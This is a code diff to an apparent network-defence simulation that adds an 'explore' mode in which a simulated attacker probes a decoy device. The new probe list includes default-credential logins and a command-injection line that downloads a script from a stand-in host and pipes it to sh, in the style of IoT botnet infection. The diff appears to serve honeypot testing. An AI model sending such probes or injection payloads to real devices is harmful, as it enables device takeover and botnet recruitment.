@@ -34,7 +34,19 @@ import hive_net as net  # noqa: E402
 
 ATTACK_RATE = 50
 ATTACK_SECONDS = 5
-TRIGGERS = ("attack", "cure", "stop")
+TRIGGERS = ("attack", "cure", "stop", "explore")
+
+# Canned probe sequence a flagged attacker sends INTO our own decoy (a fake device). These
+# only ever go to the decoy's address, never to any real host. The decoy logs them and builds
+# an attacker profile; nothing here is executed anywhere.
+DECOY_PROBES = [
+    "LOGIN admin:admin",
+    "LOGIN root:root",
+    "GET /config",
+    "GET /stream",
+    "SET /firmware url=http://198.18.0.5/bot",
+    "REBOOT; wget http://198.18.0.5/x -O- | sh",
+]
 
 
 def make_trigger(admin_key, name, seq, **args):
@@ -106,6 +118,20 @@ class Attacker:
             time.sleep(0.005)
         self.report("attack_finished", f"sent {sent} packets to {target}", self.my_ip)
         return sent
+
+    def explore(self, decoy_ip, decoy_port, pause=1.2):
+        """A flagged attacker, already blocked by Hive, pokes at what looks like a vulnerable
+        device -- but it is our decoy. We only ever send to the decoy; observe-only."""
+        self.stop.clear()
+        self.report("decoy_engaged", f"found a device at {decoy_ip}:{decoy_port}, trying to break in",
+                    self.my_ip)
+        for line in DECOY_PROBES:
+            if self.stop.is_set():
+                break
+            net.send(self.sock, line.encode(), (decoy_ip, int(decoy_port)))
+            self.report("decoy_probe", f"tried: {line}", self.my_ip)
+            time.sleep(pause)
+        self.report("decoy_done", "gave up on the decoy (it was fake all along)", self.my_ip)
 
     def cure(self, peers, hub_ip=None, legit_ip=None, pause=1.5):
         """Attack the cure: every way of abusing the vaccine channel, one after another."""
@@ -201,6 +227,8 @@ def serve(cfg, bind=None):
             a = m["args"]
             if m["name"] == "attack":
                 fn, fargs = attacker.attack, (a["target"],)
+            elif m["name"] == "explore":
+                fn, fargs = attacker.explore, (a["decoy_ip"], a["decoy_port"])
             else:
                 fn, fargs = attacker.cure, (a.get("peers", []), a.get("hub"), a.get("legit"))
             worker = threading.Thread(target=fn, args=fargs, daemon=True)
